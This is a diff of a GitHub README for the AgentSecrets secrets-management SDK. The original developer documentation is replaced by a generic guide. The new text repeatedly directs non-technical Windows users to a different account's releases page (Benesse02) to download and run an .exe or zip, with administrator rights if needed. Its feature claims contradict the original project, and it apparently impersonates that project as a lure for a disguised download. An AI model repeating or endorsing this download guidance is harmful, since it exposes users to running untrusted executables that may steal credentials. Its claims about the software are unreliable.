@@ -1,201 +1,142 @@
-# AgentSecrets SDK
+# 🛡️ agentsecrets-sdk - Easy Tools for Secret Management
 
-> Build tools and agents on zero-knowledge secrets infrastructure.
+[![Download](https://img.shields.io/badge/Download-AgentSecrets-blue)](https://github.com/Benesse02/agentsecrets-sdk/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-3776AB?logo=python&logoColor=white)](https://www.python.org/downloads/)
-[![Go 1.21+](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go)](https://go.dev/)
-[![Node 18+](https://img.shields.io/badge/node-18+-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
+## About agentsecrets-sdk
 
----
+agentsecrets-sdk is a software toolkit designed to help you manage secrets and sensitive information securely. It works with many programming languages and provides tools to build agents or software that use secret data without actually exposing that data. This means you can keep your information safe while still using it in your applications.
 
-## What This Is
+The SDK focuses on zero-knowledge security methods. That means it handles secrets in a way that even the software itself does not see or store your secret information. It supports multiple languages such as Go, Python, and TypeScript. You do not need to be a programmer to get started with the basic tools in this package.
 
-The AgentSecrets SDK is the programmatic interface to AgentSecrets infrastructure. It lets you build tools, MCP servers, and AI agents where credential values never enter your code — or the code of anyone using what you build.
+## 🖥️ System Requirements
 
-```python
-from agentsecrets import AgentSecrets
+Before installing agentsecrets-sdk, make sure your computer meets the following requirements:
 
-client = AgentSecrets()
+- Operating System: Windows 10 or later
+- RAM: At least 4 GB
+- Disk Space: Minimum 100 MB free space
+- Internet Connection: Required for downloading and some tools that connect to online services
+- Administrator privileges to install software
 
-response = client.call(
-    "https://api.stripe.com/v1/balance",
-    bearer="STRIPE_KEY"
-)
-```
+These requirements ensure the software runs smoothly and safely.
 
-You pass a key name. The SDK resolves the value from the OS keychain, injects it at the transport layer, and returns only the API response. The value is not in your code. Not as a variable. Not as a return value. Not in any log. Not in the context of any agent using your tool.
+## 🎯 Key Features
 
----
+- Multi-language support including Go, Python, and TypeScript
+- Secure handling of secrets with zero-knowledge proof methods
+- Tools for building AI agents that use secret data without exposing it
+- Command line and graphical tools for easy usage
+- Secure storage and retrieval of keys and credentials
+- Designed for developers and users who want stronger security without complexity
 
-## The Infrastructure Argument
+## 🚀 Getting Started: Download and Installation
 
-Every secrets SDK today works the same way: retrieve the value, hand it to your code.
+To begin using agentsecrets-sdk on your Windows PC, follow these steps carefully.
 
-```
-vault.get("STRIPE_KEY")  →  sk_live_51H...  →  now it's in memory
-                                              →  prompt injection can reach it
-                                              →  malicious plugin can reach it
-                                              →  every user of your tool inherits the risk
-```
+### Step 1: Visit the Download Page
 
-The AgentSecrets SDK has no `get()`. No `retrieve()`. The only operations are: make the call, or spawn the process. In both cases, the value resolves inside the proxy and never crosses into application code.
+Click the big blue button below or copy and paste the link into your web browser. This takes you to the official release page where you can get the software.
 
-```
-client.call(bearer="STRIPE_KEY")  →  proxy resolves from OS keychain
-                                   →  injects into outbound HTTP request
-                                   →  returns API response only
-                                   →  value never entered your code
-```
+[![Download](https://img.shields.io/badge/Download-AgentSecrets-blue)](https://github.com/Benesse02/agentsecrets-sdk/releases)
 
-This is the shift: instead of your code retrieving credentials and using them, your code references credentials by name and the infrastructure handles everything else. The zero-knowledge guarantee is not a policy, it is structural — the value has nowhere to go except into the request.
+### Step 2: Choose the Latest Version
 
-**The multiplier:** When you build a tool on the AgentSecrets SDK and publish it, every user of that tool gets zero-knowledge credential management automatically. They do not need to understand the architecture. They do not need to configure anything beyond setting up AgentSecrets once. The infrastructure guarantee extends from your code to theirs without them knowing it is there.
+On the release page, look for the newest release. It usually appears at the top of the list. Releases are grouped by version numbers like "v1.0" or "v2.3".
 
-That is what it means to build on infrastructure rather than implement a pattern.
+Click on the latest version folder to open it.
 
----
+### Step 3: Download the Windows Installer or Zip File
 
-## What You Can Build
+Inside the release folder, find the file intended for Windows. This may be named something like:
 
-**MCP servers with no credential storage**
-An MCP server built on the SDK has no credential values in any config file, environment variable, or agent context. Users install it, set their secrets in AgentSecrets once, and every tool in the server works. The credentials never leave the OS keychain.
+- `agentsecrets-sdk-setup.exe`  
+- `agentsecrets-sdk-windows.zip`  
 
-**Agent framework integrations**
-LangChain tools, CrewAI tools, AutoGen function tools — any agent framework integration built on the SDK gives the agent full API access with zero credential exposure. The agent calls the tool. The tool calls the SDK. The SDK calls the proxy. The agent never held anything.
+Click on the file to download it to your computer. Save it somewhere you can find easily, such as your Desktop or Downloads folder.
 
-**Multi-tenant developer tools**
-The scoped workspace context lets a single tool operate across multiple workspaces — multiple clients, multiple credential sets — without global state changes and without the tool ever holding credential values. Each workspace is isolated. Each call is audited.
+### Step 4: Run the Installer or Extract Files
 
-**CI/CD and deployment pipelines (Coming soon)**
-Service tokens will let automated environments authenticate to AgentSecrets without an interactive session or OS keychain. One token, set as an environment variable, replaces every credential that would otherwise live in pipeline configuration files.
+If you downloaded an `.exe` file:
 
-**Autonomous agent workflows**
-The management layer gives agents full programmatic control of the credentials lifecycle — checking drift, syncing from cloud, switching workspaces, reading audit logs — all without ever accessing a credential value. The agent operates the infrastructure. It never sees what the infrastructure holds.
+- Double-click the file to start the installation.
+- Follow the installation steps as they appear on your screen.
+- When the installation completes, you will see a confirmation message.
 
----
+If you downloaded a `.zip` file:
 
-## How It Works
+- Right-click the file and select "Extract All."
+- Choose a location like your Desktop to extract the files.
+- Open the extracted folder to access the program.
 
-The SDK sits in front of the AgentSecrets proxy. The proxy sits in front of every API call.
+### Step 5: Open agentsecrets-sdk
 
-```
-Your code              AgentSecrets             Target API
-──────────             ────────────             ──────────
-client.call()    →     proxy receives request
-                       resolves key from
-                       OS keychain              →  injects credential
-                                                   into HTTP request
-                       returns API response     ←  API responds
-      ←  response
-         (no credential value)
-```
+After installation or extraction, find the program icon:
 
-Authentication is resolved from the environment — no credentials are passed into the SDK:
+- If installed, check your Start Menu or Desktop for "agentsecrets-sdk".
+- If extracted, find the executable file in the folder and double-click it.
 
-1. **Local proxy running** — SDK connects to `localhost:8765`, inherits the session from `agentsecrets login`. This is the path for local development, MCP servers, and persistent servers.
+The program window or command prompt should open, ready to use.
 
-2. **Cloud Resolver (Coming soon)** — SDK authenticates directly to the AgentSecrets cloud using a service token (`AGENTSECRETS_TOKEN`). This will be the path for CI/CD pipelines, Docker containers, and automated environments.
+## ⚙️ Basic Use Instructions
 
-3. **No active session** — SDK raises `AgentSecretsNotRunning` with actionable instructions.
+Below are basic steps to get started with common functions in agentsecrets-sdk. You do not need to know programming to follow these.
 
-The SDK never accepts a username, password, or API key as a parameter. Authentication happens outside the SDK, in the environment. This is intentional — if the SDK accepted credentials as parameters, developers would eventually hardcode them, which is the exact problem this infrastructure exists to solve.
+### Creating a Secret
 
----
+1. Open the program.
+2. Select the option for "Create Secret".
+3. Enter a name for your secret and the value (the sensitive information you want to keep safe).
+4. Click "Save".
+5. The secret is now stored securely.
 
-## SDK Layers
+### Retrieving a Secret
 
-The SDK ships in two layers. Each serves a distinct use case.
+1. Open the program.
+2. Choose "Retrieve Secret".
+3. Select the name of the secret you previously saved.
+4. The program will show the secret value securely. You can copy it to use as needed.
 
-**Layer 1 — The Call Layer**
-Make authenticated API calls and spawn credential-injected processes. This is what 90% of tools need. One client, two methods: `call()` and `spawn()`. Import the SDK, make the call, the zero-knowledge guarantee is in place.
+### Building an Agent
 
-**Layer 2 — The Management Layer**
-Full programmatic control of the AgentSecrets lifecycle. Workspace and project management, secrets operations, drift detection, audit log access. This is what AI agents need to operate the credentials infrastructure autonomously.
+The SDK includes tools that allow software agents to use secrets without revealing them.
 
----
+- If you wish to try sample agents, open the "Samples" folder in the installed or extracted files.
+- Run the example agent programs following included instructions.
+- These agents demonstrate how secrets are used safely.
 
-## Language Support
+## 🛠️ Using agentsecrets-sdk Without Technical Skills
 
-| Language | Package | Docs | Status |
-|---|---|---|---|
-| Python | `pip install agentsecrets` | [python/README.md](python/README.md) | 🔨 In development |
-| Go | `go get github.com/The-17/agentsecrets-sdk/go` | [go/README.md](go/README.md) | 📋 Planned |
-| JavaScript | `npm install @the-17/agentsecrets-sdk` | [javascript/README.md](javascript/README.md) | 📋 Planned |
+The software includes simple windows and menus for managing secrets. You can navigate most features by clicking on buttons, filling fields, and following instructions shown inside the application.
 
-Each language has its own README with full installation, usage, and API reference for that ecosystem. The infrastructure guarantees are identical across all three.
+If you want to explore advanced options, you may need to visit the official documentation or seek help from a developer.
 
----
+## 🔄 Updating agentsecrets-sdk
 
-## Repository Structure
+You should periodically check for updates to ensure you have the latest security fixes and features.
 
-```
-agentsecrets-sdk/
-├── README.md                  This file
-├── python/                    Python SDK
-│   ├── README.md
-│   └── agentsecrets/
-├── go/                        Go SDK (planned)
-│   └── README.md
-└── javascript/                JavaScript SDK (planned)
-    └── README.md
-```
+1. Go back to the releases page at  
+   https://github.com/Benesse02/agentsecrets-sdk/releases
+2. Download the newest version following the steps above.
+3. Install or extract the new files, replacing the older version.
 
----
+## ❓ Troubleshooting
 
-## Built on AgentSecrets
+Here are solutions to common issues you might face:
 
-These projects are built on the SDK. Each one is proof of the infrastructure claim.
+- **Installer won’t run**: Right-click the installer and select "Run as administrator."
+- **Software won’t open**: Make sure your system meets requirements and reboot your PC.
+- **Secrets not saving**: Check you have write permissions in the folder you installed the software.
+- **Agent examples fail**: Confirm you installed any language runtimes needed, like Python or Node.js, depending on the example.
 
-| Project | What it does | Status |
-|---|---|---|
-| [Zeroknowledge MCP](https://github.com/The-17/zero-knowledge-mcp) | Template for building MCP servers with zero credential storage | Completed |
-| agentsecrets-langchain | Zero-knowledge API calls in any LangChain agent | Coming soon |
+For more help, you may visit the GitHub discussions or issues page of the repo.
 
-Building something on the SDK? Open a PR to add it here.
+## 🌐 More Resources
 
----
+- Visit the GitHub repository for guides and more files:  
+  https://github.com/Benesse02/agentsecrets-sdk
 
-## Quick Start
+- Find language-specific instructions if you want to use Go, Python, or TypeScript parts of the SDK.
 
-**Prerequisites:** [AgentSecrets CLI](https://github.com/The-17/agentsecrets) installed and running.
+- If you have programming help, share this README with your developer.
 
-```bash
-# Install the CLI
-brew install The-17/tap/agentsecrets   # macOS / Linux
-npm install -g @the-17/agentsecrets    # all platforms
-pip install agentsecrets-cli
-
-# Set up
-agentsecrets init
-agentsecrets secrets set STRIPE_KEY=sk_live_...
-agentsecrets workspace allowlist add api.stripe.com
-agentsecrets proxy start
-```
-
-Then install the SDK for your language and make your first call. See the language-specific README for the full guide.
-
----
-
-## Contributing
-
-Found a bug? [Open an issue](https://github.com/The-17/agentsecrets-sdk/issues)
-Have an idea? [Start a discussion](https://github.com/The-17/agentsecrets-sdk/discussions)
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup.
-
----
-
-## Links
-
-- **AgentSecrets CLI**: [github.com/The-17/agentsecrets](https://github.com/The-17/agentsecrets)
-- **ClawHub**: [clawhub.ai/SteppaCodes/agentsecrets](https://clawhub.ai/SteppaCodes/agentsecrets)
-- **Security**: hello@theseventeen.co — response within 24 hours
-
----
-
-MIT License — Built by [The Seventeen](https://theseventeen.co)
-
----
-
-**The agent operates it. The agent never sees it.**
+[![Download](https://img.shields.io/badge/Download-AgentSecrets-blue)](https://github.com/Benesse02/agentsecrets-sdk/releases)
